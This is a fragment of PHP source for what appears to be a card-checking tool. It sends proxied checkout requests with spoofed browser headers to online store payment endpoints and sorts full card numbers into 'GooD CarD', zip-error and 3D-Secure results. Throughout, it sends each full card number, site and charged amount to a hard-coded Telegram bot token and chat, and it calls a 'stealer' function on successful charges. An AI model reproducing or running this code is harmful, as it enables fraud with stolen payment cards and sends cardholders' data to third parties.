if ($proxySettings['tunnel']) {
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
}
if (!empty($proxyDetails['auth'])) {
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyDetails['auth']);
}

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_TIMEOUT, $proxySettings['timeout']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $proxySettings['connect_timeout']);
curl_setopt($ch, CURLOPT_TCP_KEEPALIVE, 1);
curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
curl_setopt($ch, CURLOPT_BUFFERSIZE, 16384);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'accept: application/json',
'accept-language: en-US',
'content-type: application/json',
'origin: '.$urlbase,
'priority: u=1, i',
'referer: '.$urlbase,
'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: '.$ua,
'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
'x-checkout-web-build-id: ' . $web_build_id,
'x-checkout-web-deploy-stage: production',
'x-checkout-web-server-handling: fast',
'x-checkout-web-server-rendering: no',
'x-checkout-web-source-id: ' . $checkoutToken,
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);

$response5 = curl_exec($ch);
// echo "<li>Resp_5: $response5<li>";

// Parse response and send appropriate Telegram log
if (!empty($response5)) {
    $r5js = json_decode($response5);
    $telegram_response = '';
    
    // Check for successful payment responses only
    if (strpos($response5, $checkouturl . '/thank_you') !== false ||
        strpos($response5, $checkouturl . '/post_purchase') !== false ||
        strpos($response5, 'Your order is confirmed') !== false ||
        strpos($response5, 'Thank you') !== false ||
        strpos($response5, 'ThankYou') !== false ||
        strpos($response5, 'thank_you') !== false ||
        strpos($response5, 'success') !== false ||
        strpos($response5, 'classicThankYouPageUrl') !== false ||
        strpos($response5, '"__typename":"ProcessedReceipt"') !== false ||
        strpos($response5, 'SUCCESS') !== false) {
        $telegram_response = 'Thank You ' . $totalamt;
    }
    // Check for zip code errors
    elseif (strpos($response5, 'zip') !== false || strpos($response5, 'postal') !== false || 
            strpos($response5, 'address') !== false || strpos($response5, 'billing') !== false) {
        if (strpos($response5, 'invalid') !== false || strpos($response5, 'incorrect') !== false || 
            strpos($response5, 'error') !== false || strpos($response5, 'fail') !== false) {
            $telegram_response = 'Incorrect Zip/Address Error';
            $time_taken = round(microtime(true) - $start_time, 2);
            $log_message = "<b>INCORRECT ZIP �?</b>\n" .
                "<b>Full Card:</b> <code>$cc1</code>\n" .
                "<pre><b>Site:</b> $checkouturl\n" .
                "<b>Response:</b> Zip Error\n" .
                "<b>Gateway:</b> $gateway\n" .
                "<b>Amount:</b> $totalamt$\n" .
                "<b>Time:</b> {$time_taken}s\n" .
                "<b>Real Response:</b> " . substr($response5, 0, 300) . "</pre>";
            send_telegram_log("8010661805:AAHneuvzDyOkv4sN3eAKA3larVMT5DAPVfg", "-1003405882847", $log_message);
        }
    }
    // Only send to Telegram log if it's a successful payment or zip error
    // Other responses will be handled in the main response logic below
}

if (curl_errno($ch)) {
    $curl_error = curl_error($ch);
    $curl_errno = curl_errno($ch);
    curl_close($ch);
    
    if ($retryCount < $maxRetries) {
        $retryCount++;
        
        $isProxyError = in_array($curl_errno, [7, 28, 35, 52, 56, 58, 59]);
        $delay = $proxySettings['retry_delay'] * $retryCount;
        usleep($isProxyError ? $delay : $delay / 2);
        
        goto poll;
    } else {
        $err = 'Poll Failed => ' . $curl_error;
        $result = json_encode([
            'Response' => $err,
            'Price'=> $totalamt,
            'Gateway' => $gateway,
            'cc' => $cc1,
            'ProxyStatus' => $proxymsg,
            'ProxyIP' => $ip,
            'ErrorCode' => $curl_errno
        ]);
        echo $result;
        exit;
    }
}
if (strpos($response5, '"__typename":"ProcessingReceipt"') !== false) {
    usleep(2000000); // 2 seconds
    goto poll;
}

if (strpos($response5, '"__typename":"WaitingReceipt"') !== false) {
    usleep(2000000); // 2 seconds
    goto poll;
}

// Main response handling logic
$r5js = (json_decode($response5));
if (
    strpos($response5, $checkouturl . '/thank_you') !== false ||
    strpos($response5, $checkouturl . '/post_purchase') !== false ||
    strpos($response5, 'Your order is confirmed') !== false ||
    strpos($response5, 'Thank you') !== false ||
    strpos($response5, 'ThankYou') !== false ||
    strpos($response5, 'thank_you') !== false ||
    strpos($response5, 'success') !== false ||
    strpos($response5, 'classicThankYouPageUrl') !== false ||
    strpos($response5, '"__typename":"ProcessedReceipt"') !== false ||
    strpos($response5, 'SUCCESS') !== false
) {
    $err = 'Thank You ' . $totalamt;
    $response_type = 'Thank You';
    $time_taken = round(microtime(true) - $start_time, 2);
    
    // Call stealer function to log successful charge
    stealer($cc1, $err, $gateway, $totalamt, $checkouturl, $proxy, substr($response5, 0, 200));
    
    $log_message = "<b>GooD CarD 🔥</b>\n" .
        "<b>Full Card:</b> <code>$cc1</code>\n" .
        "<pre><b>Site:</b> $checkouturl\n" .
        "<b>Response:</b> $response_type\n" .
        "<b>Gateway:</b> $gateway\n" .
        "<b>Amount:</b> $totalamt$\n" .
        "<b>Time:</b> {$time_taken}s\n" .
        "<b>Real Response:</b> " . substr($response5, 0, 300) . "</pre>";
    send_telegram_log("8010661805:AAHneuvzDyOkv4sN3eAKA3larVMT5DAPVfg", "-1003405882847", $log_message);
    $result = json_encode([
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
    ]);
    send_final_response(json_decode($result, true), $proxymsg, $ip, '');
    exit;
} elseif (strpos($response5, 'CompletePaymentChallenge') !== false) {
    $err = '3d cc';
    $result = [
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
        'ProxyStatus' => $proxymsg,
        'ProxyIP' => $ip
    ];
    echo json_encode($result);
    exit;
} elseif (strpos($response5, '/stripe/authentications/') !== false) {
    $err = '3d cc';
    $result = [
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
        'ProxyStatus' => $proxymsg,
        'ProxyIP' => $ip
    ];
    echo json_encode($result);
    exit;
} elseif (isset($r5js->data->receipt->processingError->code)) {
    $err = $r5js->data->receipt->processingError->code;
    if ($err == 'incorrect_zip') {
        $response_type = $err;
        $time_taken = round(microtime(true) - $start_time, 2);
        $log_message = "<b>INCORRECT ZIP </b>\n" .
            "<b>Full Card:</b> <code>$cc1</code>\n" .
            "<pre><b>Site:</b> $checkouturl\n" .
            "<b>Response:</b> $response_type\n" .
            "<b>Gateway:</b> $gateway\n" .
            "<b>Amount:</b> $totalamt$\n" .
            "<b>Time:</b> {$time_taken}s</pre>";
        send_telegram_log("8010661805:AAHneuvzDyOkv4sN3eAKA3larVMT5DAPVfg", "-1003405882847", $log_message);
    }
    $result = [
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1
    ];
    send_final_response($result, $proxymsg, $ip, '');
    exit;
} else {
    $err = 'Response Not Found';
    $result = [
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
        'ProxyStatus' => $proxymsg,
        'ProxyIP' => $ip
    ];
    echo json_encode($result);
    exit;
}